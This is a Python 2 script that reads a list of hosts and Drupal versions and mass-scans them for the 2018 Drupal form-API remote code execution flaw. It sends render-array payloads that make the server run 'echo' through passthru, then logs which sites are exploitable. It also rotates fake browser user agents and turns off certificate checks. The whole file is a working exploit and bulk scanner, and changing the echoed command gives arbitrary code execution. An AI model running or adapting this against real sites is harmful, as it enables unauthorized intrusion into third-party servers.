import requests
import re
import string
import random
import sys
import time
import urllib3
from functools import partial
from random import randint
from multiprocessing import Pool

start = time.time()
urllib3.disable_warnings()
print sys.argv[1]
file = open(sys.argv[1], 'r')
outputfile = sys.argv[2]
lines = file.readlines()
# outputfile = "output.txt"


def getRandomUserAgent():
    user_agents = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0",
                   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
                   "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36",
                   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
                   "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
                   "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",
                   "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
                   "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)",
                   "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
                   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
                   "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36",
                   "Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17",
                   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
                   "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"]
    return user_agents[randint(0, len(user_agents) - 1)]


def genSignature(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


def isFormValid(host, version, headers):
    form_id = 'user/password' if version[:1] == '7' else 'user/register'
    # check form with ?q
    url = host + '?q=' + form_id
    # print url
    try:
        r = requests.get(url, headers=headers, timeout=5)
    except :
        print url + ' : Fail request'
        # with open(outputfile, 'a') as f:
        #     f.write("%s === Request Fail ===\n" % host.encode("utf-8"))
        return False
    
    if (r.status_code == 200):
        return True
    # check form without ?q
    url = host + form_id
    # print url
    r = requests.get(url, headers=headers, timeout=5)
    if (r.status_code == 200):
        return True
    print "Form not valid"
    return False


def isPwnAble_2018(host, version, headers):
    signature = genSignature()
    version = version[:1]
    if version == '7':
        get_params = {'q': 'user/password', 'name[#post_render][]': 'passthru',
                      'name[#type]': 'markup', 'name[#markup]': ' echo ' + signature}
        post_params = {'form_id': 'user_pass',
                       '_triggering_element_name': 'name'}
        try:
            r = requests.post(host, data=post_params,
                    params=get_params, verify=False, headers=headers, timeout=5)
        except :
            return False
        m = re.search(
            r'<input type="hidden" name="form_build_id" value="([^"]+)"', r.text)
        if m:
            found = m.group(1)
            get_params = {'q': 'file/ajax/name/#value/' + found}
            post_params = {'form_build_id': found}
            res = requests.post(host, data=post_params,
                                params=get_params, headers=headers, timeout=5)
            detect = re.search(signature, res.text)
            if detect:
                return True
        else:
            return False
    if version == '8':
        host = host + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
        post_params = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[a][#post_render][]': 'passthru',
                       'mail[a][#type]': 'markup', 'mail[a][#markup]': ' echo ' + signature}
        try:
            r = requests.post(host, data=post_params,
                    verify=False, headers=headers, timeout=5)
        except:
            return False

        m = re.search(signature, r.text)
        if m:
            return True
        else:
            return False


def isVulnerable(lines):
    headers = {
        'User-Agent': getRandomUserAgent()
    }
    host = "http://"+lines.strip().split("|")[0]+"/"
    # print host
    version = lines.strip().split("|")[1]
    # print('Form Valid: ', isFormValid(host, version, headers))
    formValid = isFormValid(host, version, headers)
    if (formValid == True):
        isPwned = isPwnAble_2018(host, version, headers) 
        if isPwned == True:
            with open(outputfile, 'a') as f:
                f.write("%s === Vuln OK ===\n" % host.encode("utf-8"))
        else:
            with open(outputfile, 'a') as f:
                f.write("%s === Vuln Fail ===\n" % host.encode("utf-8"))
    else:
        with open(outputfile, 'a') as f:
            f.write("%s === Form Fail ===\n" % host.encode("utf-8"))

if __name__ == "__main__":
    # lines = 'argusme.com|7.44'
    # version = ''
    # isVulnerable(lines)
    # print('=' * 25)
    try:
        # p = Pool(processes=20)
        # result = p.map(isVulnerable, lines)
        for line in lines:
            isVulnerable(line)
        # isVulnerable(line)
    except:
        result = ""

    # Open output file and write the total time scanning
    with open(outputfile, 'a') as f:
        f.write("------| Total Time: %s |-------\n" % (time.time() - start))
